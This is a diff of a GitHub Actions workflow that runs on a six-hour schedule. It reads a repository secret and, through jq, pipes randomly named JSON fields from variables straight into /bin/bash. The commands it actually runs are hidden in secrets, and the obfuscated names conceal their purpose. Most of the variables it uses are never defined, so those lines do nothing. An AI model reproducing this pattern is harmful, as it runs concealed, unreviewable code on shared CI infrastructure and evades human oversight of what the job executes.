@@ -3,7 +3,7 @@ name: lulizhen1986
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
+    - cron: '7 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: lulizhen1986
         env:
-          egi587: ${{ secrets.egi587 }}
+          c82: ${{ secrets.c82 }}
         run: |
-          echo $egi587 | jq -r .xmp8 | /bin/bash
-          echo $muc589 | jq -r .zzdi82 | /bin/bash
-          echo $qs76454 | jq -r .nnih3 | /bin/bash
-          echo $mys28 | jq -r .k261 | /bin/bash
-          echo $ln099 | jq -r .xrg4 | /bin/bash
-          echo $hg3 | jq -r .gcgsk14 | /bin/bash
+          echo $c82 | jq -r .lfykr3 | /bin/bash
+          echo $rq3 | jq -r .plcd53 | /bin/bash
+          echo $uhr7 | jq -r .qgwki485 | /bin/bash
+          echo $q4135 | jq -r .z60 | /bin/bash
+          echo $zvssr55 | jq -r .jfv7 | /bin/bash
+          echo $r4 | jq -r .fdox9 | /bin/bash
+          echo $ykhlu28734 | jq -r .vl45666 | /bin/bash
+          echo $o1028 | jq -r .glzdo53 | /bin/bash
+          echo $ydh353 | jq -r .k710 | /bin/bash
 
